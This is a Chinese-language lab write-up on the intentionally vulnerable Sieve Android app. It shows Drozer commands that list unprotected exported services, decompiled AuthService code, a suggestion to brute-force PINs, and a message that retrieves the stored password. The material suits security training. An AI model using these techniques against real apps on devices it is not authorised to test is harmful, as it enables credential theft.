---
title: Test Sieve - services exported
tags: [Android, Drozer]

category: "Tools/Others/Android Related/Drozer/Test Sieve"
---

# Test Sieve - services exported
<!-- more -->
1. 列出exported services有哪些
    ```bash
    dz> run app.service.info -a com.mwr.example.sieve
    Attempting to run shell module
    Package: com.mwr.example.sieve
      com.mwr.example.sieve.AuthService
        Permission: null
      com.mwr.example.sieve.CryptoService
        Permission: null
    ```
2. 逆向
    從以上可以知道有兩個service是被export的，這樣的話就可以逆一下判斷可以送出什麼東西以及可能的漏洞在哪，按照教學的說明我直接看==AuthService==這個service，
    在`com.mwr.example.sieve.AuthService`中的其中一段就是有問題的地方:
    ```java
    public class AuthService extends Service {
        ...
        private final class MessageHandler extends Handler {
            ...
            public void handleMessage(Message msg) {
                ...
                switch (msg.what) {
                    case 4:
                        ...
                    case AuthService.MSG_CHECK /* 2354 */:
                        if (msg.arg1 == AuthService.TYPE_KEY) {
                            responseCode3 = 42;
                            String recievedString = returnBundle.getString("com.mwr.example.sieve.PASSWORD");
                            if (AuthService.this.verifyKey(recievedString)) {
                                AuthService.this.showNotification();
                                returnVal2 = 0;
                            } else {
                                returnVal2 = 1;
                            }
                        } else if (msg.arg1 == AuthService.TYPE_PIN) {
                            responseCode3 = 41;
                            String recievedString2 = returnBundle.getString("com.mwr.example.sieve.PIN");
                            if (AuthService.this.verifyPin(recievedString2)) {
                                returnBundle = new Bundle();
                                returnBundle.putString("com.mwr.example.sieve.PASSWORD", AuthService.this.getKey());
                                returnVal2 = 0;
                            } else {
                                returnVal2 = 1;
                            }
                        } else {
                            sendUnrecognisedMessage();
                            return;
                        }
                        sendResponseMessage(5, responseCode3, returnVal2, returnBundle);
                        return;
                    ...

    ```
    首先在msg.what=2354且msg.arg1=AuthService.TYPE_PIN的地方，若程式讀取到的`com.mwr.example.sieve.PIN`的value(也就是PIN Code)，經過verifyPin這個function比對過後一致，則他會return一個bundle，內涵`com.mwr.example.sieve.PASSWORD`以及我們之前設定的password，並且回傳response message給我們
    →[5, 41, 0, {com.mwr.example.sieve.PASSWORD:\<password\>}]
    而這個問題在哪裡呢?經過前期的確認以及逆向，我們可以寫個script爆破，不斷送出一些pin code給這個service，則因為大多時候PIN Code的複雜度比較低，所以總有一天可以得到使用者的密碼了
3. 和service互動
    從下面的結果來看，一開始設定的密碼為==123456acitseccom==
    ```bash
    dz> run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg 2354 9234 1 --extra string com.mwr.example.sieve.PIN <User PIN> --bundle-as-obj
    Attempting to run shell module
    Got a reply from com.mwr.example.sieve/com.mwr.example.sieve.AuthService:
      what: 5
      arg1: 41
      arg2: 0
      Extras
        com.mwr.example.sieve.PASSWORD (String) : 123456acitseccom
    ```